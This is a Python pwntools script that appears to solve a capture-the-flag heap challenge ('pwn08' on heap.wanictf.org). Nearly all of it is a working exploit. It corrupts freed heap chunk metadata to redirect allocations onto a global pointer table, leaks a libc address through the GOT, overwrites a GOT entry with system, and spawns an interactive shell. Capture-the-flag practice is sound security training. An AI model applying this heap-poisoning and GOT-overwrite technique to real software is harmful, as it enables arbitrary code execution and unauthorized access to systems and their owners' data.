from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './pwn08'
HOST = 'heap.wanictf.org'
PORT = 9008

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])

for i in range(4):
    r.sendlineafter('command?: ', '1')
    r.sendlineafter('[0-9]: ', str(i))
    r.sendlineafter('size?: ', str(0x18))

r.sendlineafter('command?: ', '9')
r.sendlineafter('[0-9]: ', str(2))
r.sendlineafter('command?: ', '9')
r.sendlineafter('[0-9]: ', str(1))
r.sendlineafter('command?: ', '2')
r.sendlineafter('[0-9]: ', '0')
payload = "A"*0x18+flat(0x21, 0x6020c0)
r.sendafter('memo?: ', payload)

for i in range(2):
    r.sendlineafter('command?: ', '1')
    r.sendlineafter('[0-9]: ', str(i))
    r.sendlineafter('size?: ', str(0x18))

r.sendlineafter('command?: ', '2')
r.sendlineafter('[0-9]: ', '1')
payload = ''
payload += flat(0x602020, 0x6020c0)
r.sendafter('memo?: ', payload)
r.recvuntil('***** 0 *****\n')
leak = u64(r.recvuntil('\n', True)+'\x00'*2)
dbg('leak')
base = leak - 0x000000000080aa0
dbg('base')
system = base + 0x4f550
binsh = base + 0x1b3e1a

r.sendlineafter('command?: ', '2')
r.sendlineafter('[0-9]: ', '1')
payload = ''
payload += flat(0x602058, 0x6020c0)
r.sendafter('memo?: ', payload)
r.sendlineafter('command?: ', '2')
r.sendlineafter('[0-9]: ', '0')
payload = ''
payload += flat(system)
r.sendafter('memo?: ', payload)

r.sendlineafter('command?: ', '/bin/sh\x00')


r.interactive()
r.close()
